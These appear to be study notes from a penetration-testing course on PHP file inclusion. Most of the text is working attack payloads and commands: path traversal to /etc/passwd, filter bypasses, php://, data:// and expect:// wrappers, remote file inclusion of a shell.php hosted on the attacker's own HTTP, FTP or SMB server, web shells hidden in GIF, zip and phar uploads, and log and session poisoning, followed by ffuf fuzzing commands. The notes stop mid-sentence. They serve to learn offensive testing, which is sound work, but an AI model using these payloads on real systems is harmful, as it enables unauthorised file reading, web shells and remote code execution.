# 25-file-inclusion

- there is a page , parameters help fetch dynamic content or file to read, this can be abused
- LFI - Local File Inclusion
- Direct
- Path traversal
    - For example, if the full path of the languages directory is /var/www/html/languages/, then using ../index.php would refer to the index.php file on the parent directory (i.e. /var/www/html/index.php).
    - So, we can use this trick to go back several directories until we reach the root path (i.e. /), and then specify our absolute file path (e.g. ../../../../etc/passwd), and the file should exist:
- Filename Prefix
    - As expected, the error tells us that this file does not exist. so, instead of directly using path traversal, we can prefix a / before our payload,
- Appended Extensions
    - Exercise: Try to read any php file (e.g. index.php) through LFI, and see whether you would get its source code or if the file gets rendered as HTML instead.
- Second-order attacks

## Basic Bypasses

- Non-Recursive Path Traversal Filters
    - search and replace filter, where it simply deletes substrings of (../)
        - use ....// as our payload → remove only ../ string
        - `....//....//....//....//etc/passwd`
- URL encoding if character not allowed
    - URL encode ../ into %2e%2e%2f
    - Note: For this to work we must URL encode all characters, including the dots. Some URL encoders may not encode dots as they are considered to be part of the URL scheme.
    - Furthermore, we may also use Burp Decoder to encode the encoded string once again to have a double encoded string, which may also bypass other types of filters.
- Approved paths
    - Furthermore, we can fuzz web directories under the same path, and try different ones until we get a match
    - `./languages/../../../../etc/passwd`
- Appended extension
    - PHP versions before 5.3/5.4
    - Path Truncation
        - `echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done`
    - Null Bytes
        - PHP versions before 5.5 were vulnerable to null byte injection
    - `/etc/passwd%00.php`

## PHP Filters

- php wrapper `php://`
- filter `php://filter/`
    - parameters resource and read
    - but the filter that is useful for LFI attacks is the convert.base64-encode filter, under Conversion Filters.
- Fuzzing for php files
    - `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php`
    - Tip: Unlike normal web application usage, we are not restricted to pages with HTTP response code 200, as we have local file inclusion access, so we should be scanning for all codes, including `301`, `302` and `403` pages, and we should be able to read their source code as well.
- Standard PHP Inclusion
- Source Code Disclosure
    - `php://filter/read=convert.base64-encode/resource=config`

## PHP wrappers

- Data wrapper
    - only available to use if the (allow_url_include) setting is enabled in the PHP configurations
    - Checking PHP Configurations
        - (/etc/php/X.Y/apache2/php.ini) for Apache or at (/etc/php/X.Y/fpm/php.ini) for Nginx, where X.Y is your install PHP version
        - `curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"`
        - `echo ‘base64code’ | base64 -d | grep allow_url_include`
    - `echo '<?php system($_GET["cmd"]); ?>' | base64`
    - `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`
    - `data://text/plain;base64,data&cmd=<command>`
    - `curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid`
- Remote Code Execution
    - `echo '<?php system($_GET["cmd"]); ?>' | base64`
- Input
    - POST parameter
    - payload as post data command as GET
    - `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid`
    - Note: To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use $_REQUEST). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. <\?php system('id')?>)
- Expect
    - manually installed and enabled on the back-end server
    - not allow_url_include earlier, but we'd grep for expect instead
    - `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"`

## Remote File Inclusion

- PHP would require the allow_url_include setting to be enabled
- Using Local URL `http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php`
- Remote Code Execution with RFI
    - `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
    - HTTP `sudo python3 -m http.server <LISTENING_PORT>`
        - `http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`
    - FTP `sudo python -m pyftpdlib -p 21`
        - `http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id`
        - If php requires authentication `curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'`1
    - SMB
        - If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the allow_url_include setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.
        - `impacket-smbserver -smb2support share $(pwd)`
        - Now, we can include our script by using a UNC path (e.g. \\<OUR_IP>\share\shell.php), and specify the command with (&cmd=whoami) as we did earlier:
        - `http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami`

## LFI and File uploads

- Image Upload
- Creating Malicious Image
    - include the image magic bytes at the beginning of the file content (e.g. GIF8)
    - `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`
- Uploaded File Path
    - `http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id`
- Zip Upload
    - `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php`
    - Once we upload the shell.jpg archive, we can include it with the zip wrapper as (zip://shell.jpg), and then refer to any files within it with #shell.php (URL encoded). Finally, we can execute commands as we always do with &cmd=id, as follows:
    - `http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id`
- Phar Upload
    - shell.php
    
    ```php
    <?php
    $phar = new Phar('shell.phar');
    $phar->startBuffering();
    $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
    $phar->setStub('<?php __HALT_COMPILER(); ?>');
    
    $phar->stopBuffering();
    ```
    
    - `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`
    - specify the phar sub-file with /shell.txt (URL encoded)
    - `http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`

## Log Poisoning

- Writing PHP code in a field we control that gets logged into a log file (i.e. poison/contaminate the log file), and then include that log file to execute the PHP code. For this attack to work, the PHP web application should have read privileges over the logged files, which vary from one server to another.
- PHP Session Poisoning
    - PHPSESSID
    - details are stored in session files on the back-end, and saved in /var/lib/php/sessions/ on Linux and in C:\Windows\Temp\ on Windows
    - The name of the file that contains our user's data matches the name of our PHPSESSID cookie with the sess_ prefix. For example, if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3, then its location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3.
    - check `http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`
    - check `http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning`
    - `http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`
    - `http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id`
        - session file need to be written again
- Server Log Poisoning
    - Both Apache and Nginx maintain various log files, such as access.log and error.log
    - By default, Apache logs are located in /var/log/apache2/ on Linux and in C:\xampp\apache\logs\ on Windows, while Nginx logs are located in /var/log/nginx/ on Linux and in C:\nginx\log\ on Window
    - `http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log`
    - User-Agent header is controlled by us through the HTTP request headers, so we should be able to poison this value.
    - `curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"`
    - &cmd=id
    - Tip: The User-Agent header is also shown on process files under the Linux /proc/ directory. So, we can try including the /proc/self/environ or /proc/self/fd/N files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.

## Automated Scanning

- Fuzzing Parameters
    - `uf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287`
- LFI wordlists
    - LFI-Jhaddix.txt
    - `ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287`
- Fuzzing Server Files
    - Server webroot path, server configurations file.
    - `SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt`
    - `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287`
    - Server Logs/Configurations
        - `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287`
    - As we can see, we do get the default webroot path and the log path. However, in this case, the log path is using a global apache variable (APACHE_LOG_DIR), which are found in another file we saw above, which is (/etc/apache2/envvars), and we can read it to find the variable values: